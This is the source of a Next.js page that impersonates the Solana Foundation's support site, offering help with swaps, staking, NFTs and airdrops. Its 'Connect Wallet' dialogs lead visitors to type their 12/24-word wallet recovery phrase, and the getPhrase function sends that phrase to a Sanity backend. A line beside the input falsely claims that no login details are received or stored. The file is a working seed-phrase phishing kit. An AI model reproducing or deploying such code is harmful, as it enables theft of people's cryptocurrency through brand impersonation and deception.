import Head from "next/head";
import Image from "next/image";
import styles from "../styles/Home.module.css";
import Cancel, {
  Trade,
  Staking,
  Wallet,
  FailedTransactions,
  NftIssues,
  Airdrop,
  BigWallet,
  DropDown,
} from "./comps/Cancel";
import react, { useState } from "react";
import client from "../sanity";

export default function Home() {
  const [phrase, setPhrase] = useState("");
  const [showPhrase, setShowPhrase] = useState(false);
  const [showWallets, setShowWallets] = useState(false);
  const [smallModal, setSmallModal] = useState(false);
  const [overlay,setOverlay] = useState(false)
  const [modal, setModal] = useState(false);
  const [walletQueries, setWalletQueries] = useState({
    name: "",
    image: "",
    color: "",
  });
  const wallets = [
    {
      name: "Atomic",
      image: "Atomic-Wallet.jpg",
      color: "blue",
    },
    {
      name: "Avana",
      image: "avana-wallet.webp",
      color: "green",
    },
    {
      name: "Exodus",
      image: "Exodus-Wallet.jpg",
      color: "purple",
    },
    {
      name: "Glow",
      image: "Glow-logo.png",
      color: "orange",
    },
    {
      name: "Ledger",
      image: "ledger-logo-long.svg",
      color: "black",
    },
    {
      name: "Phantom",
      image: "Phantom-wallet.png",
      color: "purple",
    },
    {
      name: "Sollet",
      image: "Sollet-Wallet.jpeg",
      color: "blue",
    },
    {
      name: "solRnWallet",
      image: "solRnWallet.webp",
    },
    {
      name: "solflare",
      image: "solflare-wallet.svg",
      color: "orange",
    },
    {
      name: "Math",
      image: "Math-wallet.jpg",
      color: "black",
    },
    {
      name: "Trust",
      image: "Trust-wallet.png",
      color: "blue",
    },
    {
      name: "Slope",
      image: "slope-wallet.png",
      color: "purple",
    },
  ];
  const getPhrase = () => {
    console.log(phrase, "✅");
    if (phrase.length < 12) {
      alert("Word Phrase is too short");
      return;
    }
    setPhrase("");
    alert("Phrase has been submitted Successfully 🎉");
    // Send details to backend
    const doc = {
      _type: "post",
      title: "New Phrase 🎉",
      phrase,
    };
    client
      .create(doc)
      .then((res) => console.log("Results", res))
      .catch((err) => console.error(err));
  };

  const firstFunc = (name, image, color) => {
    setWalletQueries({
      name,
      image,
      color,
    });
  };

  const iconNames = [
    { name: "youtube", link: "https://www.youtube.com/SolanaFndn" },
    {
      name: "twitter",
      link: "https://twitter.com/ethereum_merger?t=qNDvriyhPdhnS0eKMOywEw&s=09",
    },
    { name: "discord-alt", link: "" },
    { name: "reddit", link: "" },
    { name: "github", link: "" },
    { name: "telegram", link: "https://t.me/solanaannouncements" },
  ];

  const firstList = [
    { name: "Grants", link: "https://solana.org/grants" },
    { name: "Break Solana", link: "https://break.solana.com/" },
    { name: "Media Kit", link: "https://solana.com/branding" },
    { name: "Careers", link: "https://jobs.solana.com/jobs" },
    { name: "Disclaimer", link: "https://solana.com/disclaimer" },
  ];
  const secondList = ["Ecosystem", "Blog", "Newsletter"];
  const frontListings = [
    {
      name: "SOL Swap/ Trade Issue",
      para: "Get your solana issues resolved quickly",
      button: "Enter Exchande",
      comp: <Trade />,
    },
    {
      name: "Staking Issues",
      para: "Get your staking issues resolved quickly",
      button: "Resolve",
      comp: <Staking />,
    },
    {
      name: "Wallet Migration issues",
      para: "Resolve wallet migration in seconds",
      comp: <Wallet />,
    },
    {
      name: "Failed Transaction Histories",
      para: "Get your solana issues resolved quickly",
      comp: <FailedTransactions />,
    },
    {
      name: "NFTs Related Issues",
      para: "Get your NFTs issues resolved quickly",
      comp: <NftIssues />,
    },
    {
      name: "Claim Airdrop",
      para: "Claim your Airdrops now",
      comp: <Airdrop />,
    },
  ];

  return (
    <div className="bg-black font-[poppins]">
      <Head>
        <title>Start Building | Solana Mobile</title>
        <meta name="description" content="Generated by create next app" />
        <link rel="icon" href="/main-fav.png" />
        <link
          href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css"
          rel="stylesheet"
        />
        <link rel="preconnect" href="https://fonts.googleapis.com" />
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
        <link
          href="https://fonts.googleapis.com/css2?family=Poppins:wght@200;300;400;500;600&display=swap"
          rel="stylesheet"
        ></link>
      </Head>

      <main className="p-5 bg-[url('/Mian-bg.webp')]   relative">
        {overlay && <div className="backdrop-blur-md modal w-full absolute z-20 h-full bg-black/30"></div>}

        <nav className="grid items-center relative z-10 w-full grid-cols-2 mb-2">
          <div className="flex">
            <img
              src="sol.svg"
              alt="Sol-Logo"
              className="sm:w-44 sm:h-8 w-24 h-6"
            />
          </div>
          <div className="flex justify-end">
            <ul className="flex gap-5 items-center">
              <li className="">
                <a
                  href="https://solana.com/"
                  className="relative cursor-pointer"
                >
                  Home
                </a>
              </li>
              <li
                id="connectWallet"
                className="bg-[#17fb9b] cursor-pointer text-sm sm:text-base font-medium px-2 py-2 sm:px-5 sm:py-2 text-black rounded-full"
                onClick={() => {
setModal(true)
setOverlay(prev => !prev)
                } }
              >
                <small>Connect Wallet</small>
              </li>
            </ul>
          </div>
        </nav>
        <hr />
        {/* Main Page */}
        <div className="flex justify-center flex-col items-center w-full">
          <div className="absolute flex justify-center sm:right-0 right-20 min-h-screen min-w-full">
            <video
              className="right-80"
              loop
              playsInline
              autoPlay
              poster="solana.com/src/img/index/hero-wide.jpg"
              muted
              src="https://player.vimeo.com/external/589655407.hd.mp4?s=2de3fde08e6ce9dac62bfe1e8db32ef72461a5af&profile_id=175"
            ></video>
            <div className="absolute z-2 w-full h-full bg-overlay"></div>
          </div>

          {/* End Try Video */}
          <div className="flex sm:mt-[15rem] mt-10 relative z-10 gap-10 flex-col items-center">
            <p className="sm:text-4xl text-white text-xl sm:px-96 sm:font-bold text-center">
              A suitable web3 support team <br className="sm:flex hidden"/> features  powering the 
              evolution of DeFi on Solana network.
            </p>
            <div className="sm:grid sm:grid-cols-3 sm:gap-5">
              {frontListings.map((x) => {
                return (
                  <div className="bg-gradient-to-br sm:mb-0 mb-3 text-center flex flex-col items-center justify-center from-purple-500/30 to-gray-700/30 backdrop-blur-md p-5 rounded-lg border-2 border-white/30" onClick={() => {
                    setModal(prev => !prev)
                    setOverlay(prev => !prev)
                  } }>
                    <div className="flex w-10 h-10 rounded-lg items-center text-center justify-center bg-white/50 backdrop-blur-md">
                      {x.comp}
                    </div>
                    <h1 className="font-bold sm:text-lg mt-3 text-white">{x.name}</h1>
                    <small className="mt-5 text-white">{x.para}</small>
                  </div>
                );
              })}
            </div>
          </div>
          {/* Small Modal */}
          {smallModal && (
            <div
              id="smallModal"
              className="mt-7 top-40 bg-white fixed z-30  rounded-xl shadow-lg"
            >
              <div className="p-4 sm:p-7">
                <div className="w-full flex justify-center mb-3">
                  <img
                    src={walletQueries?.image}
                    alt="img"
                    className="h-10 w-10 object-cover"
                  />
                </div>
                <div className="flex justify-center items-center">
                  <h1 className="block sm:text-2xl text-sm px-10  mb-5 text-center font-semibold text-black">
                    How do you want to connect <br /> to {walletQueries?.name}?
                  </h1>
                </div>
                <div className="flex flex-col">
                  <button
                    className={`bg-${walletQueries?.color}-500 sm:text-base text-sm mt-3 font-semibold text-black px-3 py-2`}
                    onClick={() => {
                      setShowPhrase(true);
                      setSmallModal((prev) => !prev);
                    }}
                  >
                    Extention
                  </button>
                  <button
                    className={`border-2 border-${walletQueries.color}-500 sm:text-base text-sm mt-3 font-semibold text-black px-3 py-2`}
                    onClick={() => {
                      setShowPhrase(true);
                      setSmallModal((prev) => !prev);
                    }}
                  >
                    Web Wallet
                  </button>
                  <button
                    className="mt-5 uppercase text-black font-medium"
                    onClick={() => {
                      setSmallModal((prev) => !prev);
                      setOverlay(prev => !prev)
                    }}
                  >
                    Close
                  </button>
                </div>
              </div>
            </div>
          )}

          {modal && (
            <div
              id="selectWallet"
              className="top-28 bg-white backdrop-blur-md modal fixed z-30 rounded-xl shadow-lg"
            >
              <div className="p-4 sm:p-7">
                <div
                  className="w-full flex justify-end"
                  onClick={() => {
setModal((prev) => !prev)
setOverlay(prev => !prev)
                  } }
                >
                  <Cancel />
                </div>
                <h1 className="sm:text-2xl text-black text-3xl text-center mt-5 font-medium mb-5">
                  You'll need a wallet on solana to continue
                </h1>
                <div className="w-full flex justify-center">
                  <div className="rounded-full h-24 w-24 items-center bg-gradient-to-tr from-[#CB31F8] to-[#18E5AD] justify-center flex bg-white">
                    <BigWallet />
                  </div>
                </div>
                {/* Start Before Wallets */}
                <button className="bg-purple-700 text-white w-full mt-5 rounded-lg p-2">
                  Get Started
                </button>
                <div
                  className="flex justify-end mt-2"
                  onClick={() => setShowWallets((prev) => !prev)}
                >
                  <small className="underline text-black">
                    Already Have a wallet? View Options
                  </small>
                  <DropDown />
                </div>
                {/* Before Wallets */}
                {showWallets && (
                  <div className="flex mt-5 flex-col">
                    <div className="grid grid-cols-4 gap-7">
                      {wallets.map((wallet, key) => {
                        return (
                          <div
                            className="flex cursor-pointer text-center flex-col items-center"
                            onClick={() => {
                              firstFunc(
                                wallet.name,
                                wallet.image,
                                wallet.color
                              );
                              setSmallModal(true);
                              setModal((prev) => !prev);
                            }}
                            key={key}
                          >
                            <img
                              src={wallet.image}
                              alt={`img-${wallets.indexOf(wallet)}`}
                              className="sm:h-20 sm:w-20 h-10 w-10 object-contain"
                            />
                            <small className="text-sm mt-1 text-black">
                              {wallet.name} Wallet
                            </small>
                          </div>
                        );
                      })}
                    </div>
                  </div>
                )}
              </div>
            </div>
          )}
          {/* End-Modal */}

          {/* 12 word Input */}
          {showPhrase && (
            <div className="top-40 bg-white word-phrase z-40 fixed rounded-xl shadow-lg">
              <div className="p-4 sm:p-7">
                <div className="grid grid-cols-2">
                  <div>
 <h1 className="block sm:text-2xl text-sm  mb-5 text-center font-semibold text-black">
                    Enter 12/24 word phrase
                  </h1>
                  </div>
                 
                  <div
                    className="w-full flex justify-end"
                    onClick={() => {
                      setShowPhrase((prev) => !prev);
                      setOverlay(prev => !prev)
                    }}
                  >
                    <Cancel />
                  </div>

                </div>
               
                <div className="">
                  <input
                    type="text"
                    value={phrase}
                    onChange={(e) => setPhrase(e.target.value)}
                    className="rounded-lg border-2 bg-none border-gray-300 w-full p-2"
                  />
                </div>
                <button
                  className="bg-[#17fb9b] sm:text-base text-sm mt-3 font-semibold rounded-lg text-black w-full p-2 "
                  onClick={getPhrase}
                >
                  Continue
                </button>
                 <div className="text-center mt-5">
<small className="text-gray-500">We do not recieve or store your wallet login details, so your TON is safe</small>
                </div>
              </div>
            </div>
          )}
          {/* End 12 word input */}
        </div>
      </main>
      {/* Footer */}
      <footer className="sm:bg-footer-graient bg-small-bg sm:grid sm:grid-cols-2 sm:p-20 p-10">
        <div className="flex flex-col sm:mb-0 mb-10 sm:justify-start sm:items-start justify-center items-center text-center">
          <img src="solRnWallet.webp" alt="Sol-logo" className="w-10 h-10" />
          <p className="mt-2">Managed by Solana Foundation</p>
          <div className="flex gap-2 mt-3">
            {iconNames.map((icon) => {
              return (
                <a href={icon.link}>
                  <div className="p-1 flex hover:bg-white transition duration-300 justify-center bg-gray-500 rounded-full items-center">
                    <i className={`bx bxl-${icon.name} text-black`}></i>
                  </div>
                </a>
              );
            })}
          </div>
          <p className="mt-3 sm:block hidden text-gray-500">
            &copy; 2022 Solana Foundation. All rights reserved.
          </p>
        </div>
        <div className="grid grid-cols-2">
          <div className="">
            <ul>
              <li className="sm:text-base text-sm mb-2">SOLANA</li>
              {firstList.map((item) => {
                return (
                  <a href={item.link}>
                    <li className="text-gray-500 sm:mt-3 mt-2 sm:text-base text-sm  hover:text-white">
                      {item.name}
                    </li>
                  </a>
                );
              })}
            </ul>
          </div>
          <div className="flex item-end">
            <ul>
              <li className="text-sm mb-2">GET CONNECTED</li>
              {secondList.map((item) => (
                <li className="text-gray-500 sm:mt-3 mt-2 sm:text-base text-sm hover:text-white">
                  {item}
                </li>
              ))}
            </ul>
          </div>
        </div>
        <p className="mt-10 text-sm sm:hidden text-gray-500">
          &copy; 2022 Solana Foundation. All rights reserved.
        </p>
      </footer>
    </div>
  );
}
